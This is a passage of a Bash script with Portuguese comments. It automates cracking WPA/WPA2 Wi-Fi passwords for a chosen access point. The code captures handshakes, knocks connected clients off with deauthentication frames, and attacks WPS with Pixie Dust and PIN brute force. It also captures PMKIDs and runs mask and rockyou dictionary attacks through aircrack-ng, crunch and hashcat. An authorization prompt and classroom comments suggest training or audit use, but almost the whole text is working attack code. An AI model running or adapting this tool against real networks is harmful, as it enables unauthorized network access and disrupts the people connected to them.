cliente_do_alvo() {
    local csv
    csv="$(ls -t "${CAPTURE_PREFIX}"-[0-9]*.csv 2>/dev/null | grep -vE '\.(kismet|log)\.csv$' | head -1)"
    [[ -n "$csv" && -f "$csv" ]] || return 1
    # Mesmo artefato de ha_cliente_conectado(): exclui o próprio BSSID
    # aparecendo como "estação associada a si mesmo" (toupper($1)!=b).
    awk -F', *' -v b="${TARGET_BSSID}" '
        /^Station MAC/ { f=1; next }
        f && toupper($6)==toupper(b) && toupper($1)!=toupper(b) && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ { print $1; exit }
    ' "$csv"
}

capturar_handshake() {
    garantir_moniface_viva

    if [[ -n "${HANDSHAKE_CAP}" && -s "${HANDSHAKE_CAP}" ]] \
        && aircrack-ng -b "${TARGET_BSSID}" "${HANDSHAKE_CAP}" 2>/dev/null \
            | grep -Eqi "[1-9][0-9]* handshakes?"; then
        log "Reutilizando handshake já validado: $(basename "${HANDSHAKE_CAP}")."
        return 0
    fi
    log "Iniciando captura de handshake em ${TARGET_BSSID} (canal ${TARGET_CH})..."

    # Remove TODOS os artefatos de capturas anteriores (não só .cap/.csv, mas
    # também .kismet.csv/.netxml e .log.csv). Se sobrar qualquer captura-NN.*,
    # o airodump incrementa o índice (-02, -03...) e as funções que leem o
    # resultado passam a ler o arquivo errado.
    rm -f "${CAPTURE_PREFIX}"-* "${CAPTURE_PREFIX}".* 2>/dev/null

    # Captura em background, focada no BSSID e canal do alvo. Isso cobre os
    # dois casos possíveis sem o usuário precisar saber de antemão qual é o
    # seu: (a) já tem gente conectada agora, ou (b) ainda ninguém conectou e
    # vai conectar daqui a pouco (ex.: o professor plugando o celular).
    # Uma conexão NOVA já gera o handshake sozinha (não precisa de deauth);
    # já um cliente que ESTAVA conectado só solta um handshake novo se for
    # forçado a reconectar — por isso o deauth só é enviado quando o script
    # detecta um cliente de fato associado ao AP.
    # A saída de tela do airodump (tabela redesenhada N vezes por segundo com
    # códigos ANSI) não serve como log e inflava auditoria.log em GBs; os dados
    # úteis já vão para os arquivos ${CAPTURE_PREFIX}.* — por isso descartamos.
    local captura_err="${WORKDIR}/captura_airodump.stderr.log"
    rm -f "$captura_err"
    airodump-ng --bssid "${TARGET_BSSID}" -c "${TARGET_CH}" --write-interval 1 \
        --write "${CAPTURE_PREFIX}" "${MONIFACE}" >/dev/null 2>"$captura_err" &
    local airodump_pid=$!
    local handshake_ok=0

    echo
    echo ">>> Captura rodando no canal ${TARGET_CH} (BSSID ${TARGET_BSSID})."
    echo ">>> Não precisa saber se o dispositivo já está conectado ou vai conectar"
    echo ">>> agora — o script detecta sozinho e reage: se já tiver cliente, tenta"
    echo ">>> deauth pra forçar reconexão; se ainda não tiver, só espera a conexão"
    echo ">>> nova acontecer (ela já gera o handshake por conta própria)."
    echo ">>> Pode avisar a pessoa para conectar (ou reconectar) o dispositivo agora."
    pausar_enter

    log "Aguardando handshake (até ~2 minutos, verificando a cada 10s)..."

    local tentativas=0
    while [[ $tentativas -lt 12 ]]; do
        sleep 10
        if ! kill -0 "$airodump_pid" &>/dev/null; then
            wait "$airodump_pid" 2>/dev/null
            local captura_rc=$?
            erro "A captura terminou inesperadamente (rc=${captura_rc})."
            [[ -s "$captura_err" ]] && tail -n 20 "$captura_err" | tee -a "$LOGFILE" >&2
            break
        fi
        local capfile
        capfile="$(ls -t "${CAPTURE_PREFIX}"*.cap 2>/dev/null | head -1)"
        if [[ -n "$capfile" ]] && aircrack-ng -b "${TARGET_BSSID}" "$capfile" 2>/dev/null \
            | grep -Eqi "[1-9][0-9]* handshakes?"; then
            handshake_ok=1
            HANDSHAKE_CAP="$capfile"
            break
        fi

        if ha_cliente_conectado; then
            # Tem cliente associado agora: só vale a pena mandar deauth aqui
            # (se ele só acabou de conectar, o handshake normal da conexão
            # já deve aparecer sozinho na próxima checagem, sem precisar disso).
            log "Tentativa $((tentativas+1)): cliente associado detectado; iniciando tentativa de deauthentication autorizada."
            DEAUTH_ESTADO="executando"
            local cliente
            cliente="$(cliente_do_alvo)"
            if [[ -n "$cliente" ]]; then
                log "Tentativa $((tentativas+1)): cliente ${cliente} detectado — deauth DIRECIONADO (pode não funcionar em redes com PMF/802.11w ou canais DFS)..."
                if timeout --kill-after=5 20s aireplay-ng --deauth 5 -a "${TARGET_BSSID}" -c "${cliente}" "${MONIFACE}" &>>"$LOGFILE"; then
                    DEAUTH_ESTADO="comando_concluido"
                    log "Deauthentication: comando concluído; efeito ainda não confirmado."
                else
                    local deauth_rc=$?
                    DEAUTH_ESTADO="falhou"
                    log "Deauthentication: comando falhou ou expirou (rc=${deauth_rc})."
                fi
            else
                log "Tentativa $((tentativas+1)): cliente conectado detectado (sem MAC específico) — deauth broadcast..."
                if timeout --kill-after=5 20s aireplay-ng --deauth 5 -a "${TARGET_BSSID}" "${MONIFACE}" &>>"$LOGFILE"; then
                    DEAUTH_ESTADO="comando_concluido"
                    log "Deauthentication: comando concluído; efeito ainda não confirmado."
                else
                    local deauth_rc=$?
                    DEAUTH_ESTADO="falhou"
                    log "Deauthentication: comando falhou ou expirou (rc=${deauth_rc})."
                fi
            fi
        else
            log "Tentativa $((tentativas+1)): nenhum cliente conectado detectado ainda — aguardando conexão..."
        fi
        ((tentativas++))
    done

    if [[ $handshake_ok -eq 0 ]]; then
        echo
        if ha_cliente_conectado; then
            echo ">>> Há cliente conectado, mas o deauth não forçou o handshake (comum em"
            echo ">>> redes com PMF/802.11w ou canais DFS 52-144, onde deauth é ignorado)."
            echo ">>> AÇÃO MANUAL: peça para a pessoa desligar e ligar o WiFi do dispositivo."
        else
            echo ">>> Ainda não foi detectado nenhum cliente conectado a esta rede."
            echo ">>> Confirme que o dispositivo realmente conectou a ESTA rede (ESSID/BSSID"
            echo ">>> certos) enquanto a captura estava rodando, e tente conectar agora."
        fi
        pausar_enter

        local capfile
        capfile="$(ls -t "${CAPTURE_PREFIX}"*.cap 2>/dev/null | head -1)"
        if [[ -n "$capfile" ]] && aircrack-ng -b "${TARGET_BSSID}" "$capfile" 2>/dev/null \
            | grep -Eqi "[1-9][0-9]* handshakes?"; then
            handshake_ok=1
            HANDSHAKE_CAP="$capfile"
        fi
    fi

    # Encerra o airodump-ng em background com prazo: TERM, espera até 5s,
    # e força KILL se ele não morrer sozinho (evita travar pra sempre no "wait").
    kill "$airodump_pid" &>/dev/null || true
    for _ in 1 2 3 4 5; do
        kill -0 "$airodump_pid" &>/dev/null || break
        sleep 1
    done
    kill -9 "$airodump_pid" &>/dev/null || true
    wait "$airodump_pid" 2>/dev/null || true

    if [[ $handshake_ok -eq 1 ]]; then
        log "Handshake capturado com sucesso."
        return 0
    else
        erro "Não foi possível capturar o handshake."
        return 1
    fi
}

ultimo_cap() {
    ls -t "${CAPTURE_PREFIX}"*.cap 2>/dev/null | head -1
}

# ============================================================================
# 10. ROTA A — ATAQUE DE MÁSCARA (quando se conhece parte da senha)
# ============================================================================

rota_mascara() {
    echo
    echo "--- Rota A: ataque de máscara ---"
    local tamanho prefixo tipo_restante placeholder mascara modo restante i

    echo "Como montar a máscara?"
    echo "  [1] Máscara completa do crunch (parte conhecida em QUALQUER posição)"
    echo "  [2] Modo guiado: prefixo conhecido + uma classe para o resto"
    echo "  [3] Máscara hashcat (?a=qualquer caractere; usa GPU) — p/ posições cuja classe você não sabe"
    read -rp "Escolha: " modo

    case "$modo" in
        1)
            echo "Coringas (convenção do crunch) nas posições DESCONHECIDAS:"
            echo "  %=número   ,=maiúscula   @=minúscula   ^=símbolo"
            echo "Resto fica FIXO. Ex.: HEX%%123%% = HEX + 2 dígitos + 123 + 2 dígitos."
            read -rp "Máscara: " mascara
            if [[ -z "$mascara" ]]; then
                erro "Máscara vazia. Abortando rota de máscara."
                return 1
            fi
            # Tamanho = nº de posições de saída; \X (coringa escapado) conta como 1
            local sem_escape="${mascara//\\/}"
            tamanho=${#sem_escape}
            if ! [[ "$mascara" =~ [%,@^] ]]; then
                log "Aviso: máscara sem coringa (% , @ ^) — vai testar só essa senha fixa."
            fi
            ;;
        2)
            read -rp "Tamanho total da senha (ex.: 12): " tamanho
            read -rp "Prefixo conhecido (ex.: CRIPTO): " prefixo
            if ! [[ "$tamanho" =~ ^[0-9]+$ ]]; then
                erro "Tamanho inválido. Abortando rota de máscara."
                return 1
            fi
            restante=$(( tamanho - ${#prefixo} ))
            if [[ $restante -lt 0 ]]; then
                erro "Prefixo maior que o tamanho total. Abortando rota de máscara."
                return 1
            fi
            echo "Tipo de caractere nas posições desconhecidas:"
            echo "  [1] números (%)"
            echo "  [2] maiúsculas (,)"
            echo "  [3] minúsculas (@)"
            echo "  [4] símbolos (^)"
            read -rp "Escolha: " tipo_restante
            case "$tipo_restante" in
                1) placeholder="%" ;;
                2) placeholder="," ;;
                3) placeholder="@" ;;
                4) placeholder="^" ;;
                *) erro "Opção inválida."; return 1 ;;
            esac
            mascara="${prefixo}"
            for ((i=0; i<restante; i++)); do mascara+="${placeholder}"; done
            ;;
        3)
            rota_mascara_hashcat
            return $?
            ;;
        *)
            erro "Opção inválida."
            return 1
            ;;
    esac

    # Guarda a máscara crunch para a Rota D (PMKID) reaproveitar se esta falhar.
    MASK_KIND="crunch"; MASK_STR="$mascara"; MASK_TAM="$tamanho"; MASK_CUSTOM=""

    if [[ "$tamanho" -lt 8 ]]; then
        log "Aviso: WPA/WPA2 exige senha de 8+ caracteres — máscara de ${tamanho} dificilmente casa."
    fi

    log "Capturando handshake para rodar máscara '${mascara}' (tamanho ${tamanho})..."
    if ! capturar_handshake; then
        return 1
    fi

    local cap
    cap="$(ultimo_cap)"
    log "Rodando crunch + aircrack-ng com máscara ${mascara}..."

    SENHA_ENCONTRADA="$(crunch "${tamanho}" "${tamanho}" -t "${mascara}" 2>>"$LOGFILE" \
        | aircrack-ng -w - -b "${TARGET_BSSID}" "${cap}" 2>>"$LOGFILE" \
        | grep -i "KEY FOUND" | sed -E 's/.*\[\s*(.*)\s*\].*/\1/')"

    if [[ -n "${SENHA_ENCONTRADA}" ]]; then
        ROTA_USADA="Máscara (crunch)"
        log "Senha encontrada via máscara (valor redigido do log)."
        return 0
    fi

    erro "Máscara não encontrou a senha com os parâmetros informados."
    return 1
}

# Variante da Rota A com coringas do hashcat (-a 3). Diferente do crunch, o
# hashcat tem ?a = QUALQUER caractere imprimível (?l minúscula, ?u maiúscula,
# ?d dígito, ?s símbolo) — útil quando você não sabe a classe de uma posição.
# Usa GPU; cai para CPU com --force se nenhum dispositivo for detectado.
rota_mascara_hashcat() {
    local mascara custom
    echo
    echo "Coringas do hashcat: ?d=dígito ?l=minúscula ?u=maiúscula ?s=símbolo ?a=qualquer."
    echo "Resto fica FIXO. Ex.: HEX?a?a12?a?a = HEX + 2 quaisquer + 12 + 2 quaisquer."
    read -rp "Máscara hashcat: " mascara
    if [[ -z "$mascara" ]]; then
        erro "Máscara vazia. Abortando."
        return 1
    fi
    read -rp "Charset custom p/ ?1 (ex.: ?l?u?d; ENTER p/ pular): " custom

    # Guarda a máscara hashcat para a Rota D (PMKID) reaproveitar se esta falhar.
    MASK_KIND="hashcat"; MASK_STR="$mascara"; MASK_CUSTOM="$custom"; MASK_TAM=""

    if ! capturar_handshake; then
        return 1
    fi
    local cap
    cap="$(ultimo_cap)"

    if ! command -v hcxpcapngtool &>/dev/null; then
        erro "hcxpcapngtool não encontrado — não dá pra converter a captura pro hashcat."
        return 1
    fi
    local hashfile="${WORKDIR}/hash_mask.hc22000"
    rm -f "$hashfile"
    hcxpcapngtool -o "$hashfile" "$cap" &>>"$LOGFILE"
    if [[ ! -s "$hashfile" ]]; then
        erro "Não foi possível extrair hash da captura (handshake pode estar incompleto)."
        return 1
    fi

    local found="${WORKDIR}/hashcat_mask_found.txt"
    local hc_out="${WORKDIR}/hashcat_mask.out"
    rm -f "$found"
    local custom_flag=()
    [[ -n "$custom" ]] && custom_flag=(-1 "$custom")

    log "Rodando hashcat -a 3 com máscara '${mascara}' (pode demorar conforme o espaço de busca)..."
    hashcat -m 22000 "$hashfile" -a 3 "${custom_flag[@]}" "$mascara" \
        --potfile-disable -o "$found" >"$hc_out" 2>&1
    cat "$hc_out" >> "$LOGFILE"
    # Sem GPU/driver OpenCL o hashcat aborta com "No devices" — repete forçando CPU.
    if [[ ! -s "$found" ]] && grep -qiE "no devices? (found|left)" "$hc_out"; then
        log "Nenhum dispositivo detectado — repetindo com --force (CPU, mais lento)..."
        hashcat -m 22000 "$hashfile" -a 3 "${custom_flag[@]}" "$mascara" \
            --force --potfile-disable -o "$found" >"$hc_out" 2>&1
        cat "$hc_out" >> "$LOGFILE"
    fi

    if [[ -s "$found" ]]; then
        SENHA_ENCONTRADA="$(cut -d':' -f2- "$found" | tail -1)"
        ROTA_USADA="Máscara (hashcat -a 3)"
        log "Senha encontrada via máscara hashcat (valor redigido do log)."
        return 0
    fi

    erro "Máscara hashcat não encontrou a senha com os parâmetros informados."
    return 1
}

# Quebra um arquivo hc22000 usando a máscara guardada (MASK_*). Ecoa a senha
# encontrada (ou nada) e retorna 0/1. Usada pela Rota D (PMKID) para quebrar
# o hash sem depender de handshake. Usa GPU; repete com --force se "No devices".
quebrar_hc22000_com_mascara() {
    local hashfile="$1"
    [[ -z "$MASK_KIND" ]] && return 1
    [[ -s "$hashfile" ]] || return 1
    command -v hashcat &>/dev/null || return 1

    local found="${WORKDIR}/mask_found.txt"
    local hc_out="${WORKDIR}/mask_hashcat.out"
    rm -f "$found"

    if [[ "$MASK_KIND" == "hashcat" ]]; then
        local cf=(); [[ -n "$MASK_CUSTOM" ]] && cf=(-1 "$MASK_CUSTOM")
        hashcat -m 22000 "$hashfile" -a 3 "${cf[@]}" "$MASK_STR" \
            --potfile-disable -o "$found" >"$hc_out" 2>&1
        if [[ ! -s "$found" ]] && grep -qiE "no devices? (found|left)" "$hc_out"; then
            hashcat -m 22000 "$hashfile" -a 3 "${cf[@]}" "$MASK_STR" \
                --force --potfile-disable -o "$found" >"$hc_out" 2>&1
        fi
    else
        # crunch: gera os candidatos e manda pro hashcat via stdin
        crunch "$MASK_TAM" "$MASK_TAM" -t "$MASK_STR" 2>>"$LOGFILE" \
            | hashcat -m 22000 "$hashfile" --potfile-disable -o "$found" >"$hc_out" 2>&1
        if [[ ! -s "$found" ]] && grep -qiE "no devices? (found|left)" "$hc_out"; then
            crunch "$MASK_TAM" "$MASK_TAM" -t "$MASK_STR" 2>>"$LOGFILE" \
                | hashcat -m 22000 "$hashfile" --force --potfile-disable -o "$found" >"$hc_out" 2>&1
        fi
    fi
    cat "$hc_out" >> "$LOGFILE"

    if [[ -s "$found" ]]; then
        cut -d':' -f2- "$found" | tail -1
        return 0
    fi
    return 1
}

# ============================================================================
# 11. ROTA B — WPS (Pixie Dust primeiro, depois brute de PIN)
# ============================================================================

rota_wps() {
    echo
    echo "--- Rota B: WPS ---"
    garantir_moniface_viva
    log "Verificando se o AP possui WPS ativo (wash)..."

    local banda_flag=""
    [[ "${TARGET_FREQ_LABEL}" == "5 GHz" ]] && banda_flag="-5"

    local wash_out
    wash_out="$(timeout --kill-after=5 15s wash -i "${MONIFACE}" ${banda_flag} 2>>"$LOGFILE")"
    echo "$wash_out" | tee -a "$LOGFILE"

    if ! echo "$wash_out" | grep -qi "${TARGET_BSSID}"; then
        log "AP não aparece com WPS ativo. Pulando rota WPS."
        return 1
    fi

    # O status de bloqueio do WPS é a coluna Lck (5º campo do wash):
    # BSSID  Ch  dBm  WPS  Lck  Vendor. Grepar a linha inteira por "No" dava
    # falso positivo (ex.: "Unknown"/"Nokia" no campo Vendor contêm "no").
    local lck
    lck="$(echo "$wash_out" | awk -v b="${TARGET_BSSID}" 'toupper($1)==toupper(b){print $5; exit}')"
    if [[ "${lck}" == "No" ]]; then
        log "WPS desbloqueado (Lck: No). Tentando Pixie Dust..."
    else
        log "WPS pode estar bloqueado (Lck: ${lck:-?}), mas vou tentar Pixie Dust mesmo assim."
    fi

    # --- Pixie Dust: monitorar saída em tempo real, com timeout e detecção de loop ---
    local reaver_log="${WORKDIR}/reaver_pixie.log"
    rm -f "$reaver_log"

    timeout --kill-after=5 90s reaver -i "${MONIFACE}" -b "${TARGET_BSSID}" -c "${TARGET_CH}" -K 1 -vv \
        > "$reaver_log" 2>&1 &
    local reaver_pid=$!

    local chegou_m1=0
    local inicio=$(date +%s)
    while kill -0 "$reaver_pid" 2>/dev/null; do
        sleep 3
        if grep -qi "Received M1 message" "$reaver_log"; then
            chegou_m1=1
        fi
        if grep -qi "WPS PIN:" "$reaver_log" || grep -qi "Pin cracked" "$reaver_log"; then
            break
        fi
        # Detecção de loop infeliz: identity request + timeout + transaction failed
        # repetidos sem nunca chegar no M1 -> abortar essa rota (seção 4.B do brief)
        local decorrido=$(( $(date +%s) - inicio ))
        if [[ $chegou_m1 -eq 0 && $decorrido -ge 90 ]]; then
            log "Loop de falha detectado sem receber M1 em 90s. Abortando rota WPS (roteador bloqueia PIN)."
            kill "$reaver_pid" &>/dev/null || true
            break
        fi
    done
    wait "$reaver_pid" 2>/dev/null || true

    cat "$reaver_log" >> "$LOGFILE"

    if grep -qi "WPS PIN:" "$reaver_log"; then
        local psk
        psk="$(grep -i "WPA PSK:" "$reaver_log" | sed -E "s/.*WPA PSK: '?([^']*)'?.*/\1/")"
        if [[ -n "$psk" ]]; then
            SENHA_ENCONTRADA="$psk"
            ROTA_USADA="WPS (Pixie Dust)"
            log "Senha encontrada via Pixie Dust (valor redigido do log)."
            return 0
        fi
    fi

    if [[ $chegou_m1 -eq 1 ]]; then
        log "Pixie Dust falhou mas AP respondeu (chegou no M1). Tentando brute de PIN (mais lento)..."
        rm -f "$reaver_log"
        timeout --kill-after=5 300s reaver -i "${MONIFACE}" -b "${TARGET_BSSID}" -c "${TARGET_CH}" -vv -d 15 \
            > "$reaver_log" 2>&1
        cat "$reaver_log" >> "$LOGFILE"

        if grep -qi "WPA PSK:" "$reaver_log"; then
            SENHA_ENCONTRADA="$(grep -i "WPA PSK:" "$reaver_log" | sed -E "s/.*WPA PSK: '?([^']*)'?.*/\1/")"
            ROTA_USADA="WPS (brute PIN)"
            log "Senha encontrada via brute de PIN (valor redigido do log)."
            return 0
        fi
    fi

    log "Rota WPS não teve sucesso."
    return 1
}

# ============================================================================
# 12. ROTA C — DICIONÁRIO + REGRAS (último recurso)
# ============================================================================

rota_dicionario() {
    echo
    echo "--- Rota C: dicionário + regras (hashcat / aircrack-ng) ---"

    if ! capturar_handshake; then
        return 1
    fi

    local cap
    cap="$(ultimo_cap)"

    if [[ ! -s "${ROCKYOU}" ]]; then
        erro "Wordlist rockyou.txt não disponível. Não é possível rodar a Rota C."
        return 1
    fi

    # Tenta GPU via hashcat primeiro (mais rápido), cai para aircrack-ng (CPU) se faltar GPU/driver
    local hashfile="${WORKDIR}/hash.hc22000"
    rm -f "$hashfile" "${WORKDIR}/hashcat_found.txt"
    if command -v hcxpcapngtool &>/dev/null; then
        log "Convertendo captura para formato hashcat (hc22000)..."
        hcxpcapngtool -o "$hashfile" "$cap" &>>"$LOGFILE"
    fi

    if [[ -s "$hashfile" ]] && command -v hashcat &>/dev/null; then
        log "Rodando hashcat (modo 22000) com rockyou + regra best64..."
        hashcat -m 22000 "$hashfile" "${ROCKYOU}" -r /usr/share/hashcat/rules/best64.rule \
            --potfile-disable -o "${WORKDIR}/hashcat_found.txt" &>>"$LOGFILE"

        if [[ -s "${WORKDIR}/hashcat_found.txt" ]]; then
            SENHA_ENCONTRADA="$(cut -d':' -f2- "${WORKDIR}/hashcat_found.txt" | tail -1)"
            ROTA_USADA="Dicionário (hashcat + best64)"
            log "Senha encontrada via hashcat (valor redigido do log)."
            return 0
        fi
        log "Hashcat não encontrou. Tentando fallback via aircrack-ng (CPU)..."
    fi

    log "Rodando aircrack-ng com rockyou.txt (pode demorar)..."
    SENHA_ENCONTRADA="$(aircrack-ng -w "${ROCKYOU}" -b "${TARGET_BSSID}" "$cap" 2>>"$LOGFILE" \
        | grep -i "KEY FOUND" | sed -E 's/.*\[\s*(.*)\s*\].*/\1/')"

    if [[ -n "${SENHA_ENCONTRADA}" ]]; then
        ROTA_USADA="Dicionário (aircrack-ng/rockyou)"
        log "Senha encontrada via aircrack-ng (valor redigido do log)."
        return 0
    fi

    # Wordlists extras que o usuário tenha colocado em wordlists/ (ex.: lista
    # de senhas comuns brasileiras), além do rockyou.
    local wl
    for wl in "${WORDLIST_DIR}"/*.txt; do
        [[ -e "$wl" ]] || continue
        [[ "$wl" == "${ROCKYOU}" ]] && continue
        log "Tentando wordlist extra: $(basename "$wl")..."
        if [[ -s "$hashfile" ]] && command -v hashcat &>/dev/null; then
            rm -f "${WORKDIR}/hashcat_found.txt"
            hashcat -m 22000 "$hashfile" "$wl" -r /usr/share/hashcat/rules/best64.rule \
                --potfile-disable -o "${WORKDIR}/hashcat_found.txt" &>>"$LOGFILE"
            if [[ -s "${WORKDIR}/hashcat_found.txt" ]]; then
                SENHA_ENCONTRADA="$(cut -d':' -f2- "${WORKDIR}/hashcat_found.txt" | tail -1)"
                ROTA_USADA="Dicionário ($(basename "$wl") + best64)"
                log "Senha encontrada via hashcat/wordlist extra (valor redigido do log)."
                return 0
            fi
        fi
        SENHA_ENCONTRADA="$(aircrack-ng -w "$wl" -b "${TARGET_BSSID}" "$cap" 2>>"$LOGFILE" \
            | grep -i "KEY FOUND" | sed -E 's/.*\[\s*(.*)\s*\].*/\1/')"
        if [[ -n "${SENHA_ENCONTRADA}" ]]; then
            ROTA_USADA="Dicionário ($(basename "$wl"))"
            log "Senha encontrada via aircrack-ng/wordlist extra (valor redigido do log)."
            return 0
        fi
    done

    # Estimativa honesta de inviabilidade (brute-force fora de dicionário)
    echo
    echo ">>> Senha não encontrada no dicionário rockyou.txt + regras best64."
    echo ">>> Isso sugere senha forte (fora de listas comuns de senhas vazadas)."
    echo ">>> Estimativa: um brute-force completo de uma senha WPA2 de 10+ caracteres"
    echo ">>> alfanuméricos com símbolos, no espaço de busca ~95^10, é computacionalmente"
    echo ">>> inviável em hardware comum (anos a décadas mesmo com GPU)."
    log "Rota C esgotada sem sucesso. Senha provavelmente forte/não listada."
    return 1
}

# ============================================================================
# 12.D — ROTA D: PMKID (não depende de cliente conectado nem de deauth)
# ============================================================================
#
# Alguns roteadores respondem com o PMKID (um "resumo" da chave) já na
# primeira etapa da negociação, assim que o hcxdumptool manda uma solicitação
# de associação — sem precisar de nenhum dispositivo real conectado, e sem
# derrubar ninguém com deauth. Funciona ou não dependendo do roteador (APs
# mais novos com WPA3/PMF costumam bloquear isso), por isso é só mais uma
# tentativa — não substitui as outras rotas.

rota_pmkid() {
    echo
    echo "--- Rota D: PMKID (ataque direto ao roteador, sem precisar de cliente) ---"
    garantir_moniface_viva

    if ! command -v hcxdumptool &>/dev/null; then
        log "hcxdumptool não está instalado — pulando rota PMKID."
        return 1
    fi

    local pmkid_cap="${WORKDIR}/pmkid.pcapng"
    local pmkid_hash="${WORKDIR}/pmkid.hc22000"
    local bpf_file="${WORKDIR}/pmkid_attack.bpf"
    rm -f "$pmkid_cap" "$pmkid_hash" "$bpf_file"

    # Versões atuais do hcxdumptool (6.x) não têm mais --filterlist/--filtermode;
    # o jeito oficial de restringir ao BSSID alvo é compilar um filtro BPF com
    # tcpdump e passar via --bpf (tcpdump só compila e sai, não captura nada).
    if ! tcpdump -i "${MONIFACE}" \
        "wlan addr1 ${TARGET_BSSID} or wlan addr2 ${TARGET_BSSID} or wlan addr3 ${TARGET_BSSID} or wlan addr3 ff:ff:ff:ff:ff:ff" \
        -ddd > "$bpf_file" 2>>"$LOGFILE"; then
        erro "Falha ao compilar filtro BPF para o PMKID. Pulando rota PMKID."
        return 1
    fi

    # O -c do hcxdumptool aceita canal (<=1000) OU frequência em MHz (>1000);
    # a doc recomenda usar frequência em 5 GHz. Calculamos a frequência do
    # canal pra não depender de sufixos de banda (que variam entre versões e
    # cuja convenção a/b é ambígua).
    local freq_mhz
    if [[ "${TARGET_FREQ_LABEL}" == "5 GHz" ]]; then
        freq_mhz=$(( 5000 + TARGET_CH * 5 ))
    elif [[ "${TARGET_CH}" -eq 14 ]]; then
        freq_mhz=2484
    else
        freq_mhz=$(( 2407 + TARGET_CH * 5 ))
    fi

    # hcxdumptool NÃO funciona sobre uma interface monitor já criada pelo
    # airmon-ng/iw (ele gerencia o modo monitor sozinho, direto na interface
    # física) — usar o "wlanXmon" do airmon-ng aqui resulta em 0 pacotes
    # capturados sempre, silenciosamente. Por isso saímos do modo monitor,
    # deixamos o hcxdumptool cuidar disso sozinho, e recriamos o modo
    # monitor depois pra seguir com as próximas rotas.
    #
    # Em drivers mac80211 modernos (ex.: mt7921e) o monitor é ativado DIRETO
    # na interface física — MONIFACE == IFACE, sem "wlanXmon" separada. Nesse
    # caso "airmon-ng stop" fica confuso (não reconhece o próprio padrão de
    # nome) e devolve a interface num estado quebrado ("NOT in station mode"),
    # fazendo o hcxdumptool falhar com "failed to arm interface" a seguir.
    # Evitamos isso trocando o tipo da interface direto via iw/ip quando
    # MONIFACE == IFACE, sem passar pelo airmon-ng nesse trecho específico.
    log "Saindo do modo monitor (hcxdumptool precisa da interface física crua)..."
    if [[ "${MONIFACE}" == "${IFACE}" ]]; then
        ip link set "${IFACE}" down &>>"$LOGFILE"
        iw dev "${IFACE}" set type managed &>>"$LOGFILE"
        ip link set "${IFACE}" up &>>"$LOGFILE"
    else
        airmon-ng stop "${MONIFACE}" &>>"$LOGFILE"
    fi
    sleep 1

    # -w (não -o) é o flag de saída no hcxdumptool >= 6.3.0 / 7.x (Ubuntu/Kali atuais).
    log "Tentando capturar PMKID direto do roteador por 30s (canal ${TARGET_CH}, ${freq_mhz} MHz)..."
    timeout --kill-after=5 30s hcxdumptool -i "${IFACE}" -w "$pmkid_cap" \
        --bpf="$bpf_file" -c "${freq_mhz}" &>>"$LOGFILE"

    # Sempre volta pro modo monitor, mesmo se a rota falhar — as próximas
    # rotas (dicionário) dependem disso. Mesma lógica: se a interface física
    # e a de monitor eram a mesma, volta direto via iw/ip em vez de
    # "airmon-ng start" (que reproduziria o mesmo estado quebrado).
    log "Recriando modo monitor para seguir com as próximas rotas..."
    if [[ "${MONIFACE}" == "${IFACE}" ]]; then
        ip link set "${IFACE}" down &>>"$LOGFILE"
        iw dev "${IFACE}" set type monitor &>>"$LOGFILE"
        ip link set "${IFACE}" up &>>"$LOGFILE"
        sleep 1
        MONIFACE="${IFACE}"
    else
        airmon-ng start "${IFACE}" &>>"$LOGFILE"
        sleep 2
        MONIFACE="$(iw dev | awk '/Interface/{print $2}' | grep -i 'mon' | head -n1)"
        [[ -z "${MONIFACE}" ]] && MONIFACE="${IFACE}"
    fi
    if ! iw dev "${MONIFACE}" info 2>/dev/null | grep -qi "type monitor"; then
        erro "Não foi possível recriar o modo monitor em ${MONIFACE} após a tentativa de PMKID."
    fi
    log "Interface em modo monitor novamente: ${MONIFACE}"

    if [[ ! -s "$pmkid_cap" ]]; then
        log "Nenhum pacote capturado na tentativa de PMKID."
        return 1
    fi

    if ! command -v hcxpcapngtool &>/dev/null; then
        erro "hcxpcapngtool não encontrado — não é possível converter o PMKID capturado."
        return 1
    fi

    hcxpcapngtool -o "$pmkid_hash" "$pmkid_cap" &>>"$LOGFILE"

    if [[ ! -s "$pmkid_hash" ]]; then
        log "O roteador não respondeu com PMKID (comum em APs com WPA3/PMF). Rota D sem sucesso."
        return 1
    fi

    # Se o usuário informou uma máscara na Rota A, tenta ela no PMKID primeiro —
    # assim dá pra quebrar SEM depender de cliente conectado (handshake).
    if [[ -n "$MASK_KIND" ]]; then
        log "PMKID capturado! Tentando quebrar com a máscara informada (${MASK_STR})..."
        local senha_mask
        senha_mask="$(quebrar_hc22000_com_mascara "$pmkid_hash")"
        if [[ -n "$senha_mask" ]]; then
            SENHA_ENCONTRADA="$senha_mask"
            ROTA_USADA="PMKID + máscara"
            log "Senha encontrada via PMKID + máscara (valor redigido do log)."
            return 0
        fi
        log "Máscara não quebrou o PMKID. Tentando dicionário (rockyou)..."
    fi

    if [[ ! -s "${ROCKYOU}" ]]; then
        erro "Wordlist rockyou.txt não disponível. Não é possível quebrar o PMKID capturado."
        return 1
    fi

    log "PMKID capturado! Tentando quebrar com hashcat (rockyou + best64)..."
    rm -f "${WORKDIR}/pmkid_found.txt"
    hashcat -m 22000 "$pmkid_hash" "${ROCKYOU}" -r /usr/share/hashcat/rules/best64.rule \
        --potfile-disable -o "${WORKDIR}/pmkid_found.txt" &>>"$LOGFILE"

    if [[ -s "${WORKDIR}/pmkid_found.txt" ]]; then
        SENHA_ENCONTRADA="$(cut -d':' -f2- "${WORKDIR}/pmkid_found.txt" | tail -1)"
        ROTA_USADA="PMKID (hcxdumptool + hashcat)"
        log "Senha encontrada via PMKID (valor redigido do log)."
        return 0
    fi

    log "PMKID capturado mas senha não encontrada no dicionário. Rota D sem sucesso final."
    return 1
}

# ============================================================================
# 13. ESCOLHA/EXECUÇÃO AUTOMÁTICA DA ROTA DE ATAQUE
# ============================================================================

executar_ataque() {
    confirmar_autorizacao

    local sabe_parte
    if confirmar "Você conhece parte da senha (prefixo e tamanho)?"; then
        if rota_mascara; then
            return 0
        fi
        log "Rota de máscara não teve sucesso. Seguindo para as próximas rotas."
    fi

    if rota_wps; then
        return 0
    fi
    log "Rota WPS não teve sucesso (ou não aplicável). Seguindo para PMKID."

    if rota_pmkid; then
        return 0
    fi
    log "Rota PMKID não teve sucesso (ou não aplicável). Seguindo para dicionário."

    if rota_dicionario; then
        return 0
    fi

    erro "Nenhuma rota de ataque teve sucesso. Senha não descoberta."
    return 1
}

# ============================================================================
